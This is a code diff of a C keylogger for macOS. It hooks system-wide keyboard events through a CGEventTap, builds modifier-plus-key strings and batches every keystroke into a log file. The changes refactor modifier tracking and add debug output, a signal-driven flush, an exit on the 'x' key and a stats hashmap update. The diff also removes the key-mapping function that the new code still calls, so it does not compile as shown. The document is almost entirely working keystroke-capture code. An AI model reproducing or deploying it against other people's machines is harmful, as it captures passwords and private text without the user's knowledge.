@@ -12,7 +12,7 @@ int buffer_index = 0;
 int hashmap_size = 0;
 int stats_size = 0;
 
-void flush() {
+void flush(int code) {
   if (buffer_index == 0) return;
   // write to file
   fwrite(buffer, 1, buffer_index, logfile);
@@ -20,7 +20,13 @@ void flush() {
 
   buffer_index = 0;
   memset(buffer, 0, BATCH_SZ);
-}
+
+  if (code != 0) {
+    fprintf(logfile, "Keylogging has ended.\n");
+    fclose(logfile);
+    exit(0);
+  };
+};
 
 int main(int argc, const char *argv[]) {
   signal(SIGINT, flush);
@@ -82,6 +88,7 @@ int main(int argc, const char *argv[]) {
   return 0;
 }
 
+int count = 0;
 CGEventRef CGEventCallback(
   CGEventTapProxy proxy,
   CGEventType type,
@@ -91,73 +98,92 @@ CGEventRef CGEventCallback(
   if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
     return event;
   };
+  printf("\n\nEvent type: %d\n", type);
 
   CGEventFlags flags = CGEventGetFlags(event);
   CGKeyCode keyCode =
       (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-  // Calculate key up/down.
-  bool rcmd = false, lcmd = false;
-  bool rshift = false, lshift = false;
-  bool ropt = false, lopt = false;
-  bool rctrl = false, lctrl = false;
   bool caps = false;
+  bool down = false;
+  bool meta = keyCode >= 54 && keyCode <= 62;;
+  int pressed = 0;
+  int meta_flags = 0;
+
+  if(keyCode == 7){
+    exit(0);
+  };
 
   if (type == kCGEventFlagsChanged) {
     switch (keyCode) {
-      case 54:  // [rcmd]
-        rcmd = (flags & kCGEventFlagMaskCommand) && !(lastFlags & kCGEventFlagMaskCommand);
+      case 54:  // [right-cmd]
+      case 55:  // [left-cmd]
+        down = (flags & kCGEventFlagMaskCommand) &&
+               !(lastFlags & kCGEventFlagMaskCommand);
+        if (keyCode == 54) meta_flags ^= _RCMD;
+        if (keyCode == 55) meta_flags ^= _LCMD;
         break;
-      case 55:  // [lcmd]
-        lcmd = (flags & kCGEventFlagMaskCommand) && !(lastFlags & kCGEventFlagMaskCommand);
+      case 56:  // [left-shift]
+      case 60:  // [right-shift]
+        down = (flags & kCGEventFlagMaskShift) &&
+               !(lastFlags & kCGEventFlagMaskShift);
+        if (keyCode == 60) meta_flags ^= _RSFT;
+        if (keyCode == 56) meta_flags ^= _LSFT;
         break;
-      case 56:  // [lshift]
-        lshift = (flags & kCGEventFlagMaskShift) && !(lastFlags & kCGEventFlagMaskShift);
+      case 58:  // [left-option]
+      case 61:  // [right-option]
+        down = (flags & kCGEventFlagMaskAlternate) &&
+               !(lastFlags & kCGEventFlagMaskAlternate);
+        if (keyCode == 58) meta_flags ^= _LOPT;
+        if (keyCode == 61) meta_flags ^= _ROPT;
         break;
-      case 60:  // [rshift]
-        rshift = (flags & kCGEventFlagMaskShift) && !(lastFlags & kCGEventFlagMaskShift);
-        break;
-      case 58:  // [loption]
-        lopt = (flags & kCGEventFlagMaskAlternate) && !(lastFlags & kCGEventFlagMaskAlternate);
-        break;
-      case 61:  // [roption]
-        ropt = (flags & kCGEventFlagMaskAlternate) && !(lastFlags & kCGEventFlagMaskAlternate);
-        break;
-      case 59:  // [lctrl]
-        lctrl = (flags & kCGEventFlagMaskControl) && !(lastFlags & kCGEventFlagMaskControl);
-        break;
-      case 62:  // [rctrl]
-        rctrl = (flags & kCGEventFlagMaskControl) && !(lastFlags & kCGEventFlagMaskControl);
+      case 59:  // [left-ctrl]
+      case 62:  // [right-ctrl]
+        down = (flags & kCGEventFlagMaskControl) &&
+               !(lastFlags & kCGEventFlagMaskControl);
+        if (keyCode == 59) meta_flags ^= _LCTL;
+        if (keyCode == 62) meta_flags ^= _RCTL;
         break;
       case 57:  // [caps]
-        caps = (flags & kCGEventFlagMaskAlphaShift) && !(lastFlags & kCGEventFlagMaskAlphaShift);
-        break;
+        down = (flags & kCGEventFlagMaskAlphaShift) &&
+               !(lastFlags & kCGEventFlagMaskAlphaShift);
       default:
         break;
     }
+    printf("Metaflags: %d\n", meta_flags);
   } else if (type == kCGEventKeyDown) {
     down = true;
   }
-  lastFlags = flags;
 
-  if (!down) return event;
+  count++;
+  printf("Count: %d, Metaflags: %d\n", count, meta_flags);
+  printf("Keycode: %d, Flags: %llu, LastFlags: %llu\n", keyCode, flags, lastFlags);
+  lastFlags = flags;
 
   char key_str[128];
   key_str[0] = '\0';
-  if (rcmd) strcat(key_str, "rcmd+");
-  if (lcmd) strcat(key_str, "lcmd+");
-  if (rshift) strcat(key_str, "rshift+");
-  if (lshift) strcat(key_str, "lshift+");
-  if (ropt) strcat(key_str, "ropt+");
-  if (lopt) strcat(key_str, "lopt+");
-  if (rctrl) strcat(key_str, "rctrl+");
-  if (lctrl) strcat(key_str, "lctrl+");
-  if (caps) strcat(key_str, "caps+");
+  const char *key = convertKeyCode(keyCode, isShift(flags), caps);
 
-  strcat(key_str, key);
-  printf("Key combination: %s\n", key_str);
+  if(!meta){
+    if (isSet(_RCMD, meta_flags)) strcat(key_str, "rcmd+");
+    if (isSet(_LCMD, meta_flags)) strcat(key_str, "lcmd+");
+    if (isSet(_RSFT, meta_flags)) strcat(key_str, "rshift+");
+    if (isSet(_LSFT, meta_flags)) strcat(key_str, "lshift+");
+    if (isSet(_ROPT, meta_flags)) strcat(key_str, "ropt+");
+    if (isSet(_LOPT, meta_flags)) strcat(key_str, "lopt+");
+    if (isSet(_RCTL, meta_flags)) strcat(key_str, "rctrl+");
+    if (isSet(_LCTL, meta_flags)) strcat(key_str, "lctrl+");
+    if (caps) strcat(key_str, "caps+");
 
-  const char *key = convertKeyCode(keyCode, lshift || rshift, caps);
+    strcat(key_str, key);
+    printf("Key combination: %s\n", key_str);
+  };
+  /*
+    - This line exists because special chars are triggered twice
+    - this records it only on keydown and not keyup
+    - any combinations/hooks will have to be registered BEFORE this line
+  */
+  if (!down) return event;
   for (int i = 0; i < strlen(key); i++) {
     buffer[buffer_index] = key[i];
     buffer_index++;
@@ -175,98 +201,8 @@ CGEventRef CGEventCallback(
 
 
   if (buffer_index >= BATCH_SZ - 20) {
-    flush();
+    flush(0);
     update_hashmap(&hm, &hashmap_size);
   };
   return event;
-}
-
-const char *convertKeyCode(int keyCode, bool shift, bool caps) {
-  switch ((int) keyCode) {
-    case 0:   return shift || caps ? "A" : "a";
-    case 1:   return shift || caps ? "S" : "s";
-    case 2:   return shift || caps ? "D" : "d";
-    case 3:   return shift || caps ? "F" : "f";
-    case 4:   return shift || caps ? "H" : "h";
-    case 5:   return shift || caps ? "G" : "g";
-    case 6:   return shift || caps ? "Z" : "z";
-    case 7:   return shift || caps ? "X" : "x";
-    case 8:   return shift || caps ? "C" : "c";
-    case 9:   return shift || caps ? "V" : "v";
-    case 11:  return shift || caps ? "B" : "b";
-    case 12:  return shift || caps ? "Q" : "q";
-    case 13:  return shift || caps ? "W" : "w";
-    case 14:  return shift || caps ? "E" : "e";
-    case 15:  return shift || caps ? "R" : "r";
-    case 16:  return shift || caps ? "Y" : "y";
-    case 17:  return shift || caps ? "T" : "t";
-    case 18:  return shift ? "!" : "1";
-    case 19:  return shift ? "@" : "2";
-    case 20:  return shift ? "#" : "3";
-    case 21:  return shift ? "$" : "4";
-    case 22:  return shift ? "^" : "6";
-    case 23:  return shift ? "%" : "5";
-    case 24:  return shift ? "+" : "=";
-    case 25:  return shift ? "(" : "9";
-    case 26:  return shift ? "&" : "7";
-    case 27:  return shift ? "_" : "-";
-    case 28:  return shift ? "*" : "8";
-    case 29:  return shift ? ")" : "0";
-    case 30:  return shift ? "}" : "]";
-    case 31:  return shift || caps ? "O" : "o";
-    case 32:  return shift || caps ? "U" : "u";
-    case 33:  return shift ? "{" : "[";
-    case 34:  return shift || caps ? "I" : "i";
-    case 35:  return shift || caps ? "P" : "p";
-    case 37:  return shift || caps ? "L" : "l";
-    case 38:  return shift || caps ? "J" : "j";
-    case 39:  return shift ? "\"" : "'";
-    case 40:  return shift || caps ? "K" : "k";
-    case 41:  return shift ? ":" : ";";
-    case 42:  return shift ? "|" : "\\";
-    case 43:  return shift ? "<" : ",";
-    case 44:  return shift ? "?" : "/";
-    case 45:  return shift || caps ? "N" : "n";
-    case 46:  return shift || caps ? "M" : "m";
-    case 47:  return shift ? ">" : ".";
-    case 50:  return shift ? "~" : "`";
-    case 65:  return ".";
-    case 67:  return "*";
-    case 69:  return "+";
-    case 71:  return "🔙";
-    case 75:  return "/";
-    case 76:  return "⏎";
-    case 78:  return "-";
-    case 81:  return "=";
-    case 82:  return "0";
-    case 83:  return "1";
-    case 84:  return "2";
-    case 85:  return "3";
-    case 86:  return "4";
-    case 87:  return "5";
-    case 88:  return "6";
-    case 89:  return "7";
-    case 91:  return "8";
-    case 92:  return "9";
-    case 36:  return "\n";
-    case 48:  return "\t";
-    case 49:  return " ";
-    case 51:  return "[del]";
-    case 53:  return "[esc]";
-    case 54:  return "[r⌘]";
-    case 55:  return "[l⌘]";
-    case 58:  return "[l⌥]";
-    case 59:  return "[l⎈]";
-    case 61:  return "[r⌥]";
-    case 62:  return "[r⎈]";
-    case 63:  return "[fn]";
-    case 72:  return "[volup]";
-    case 73:  return "[voldn]";
-    case 74:  return "[mute]";
-    case 123: return "→";
-    case 124: return "←";
-    case 125: return "↓";
-    case 126: return "↑";
-  }
-  return "[?]";
 }
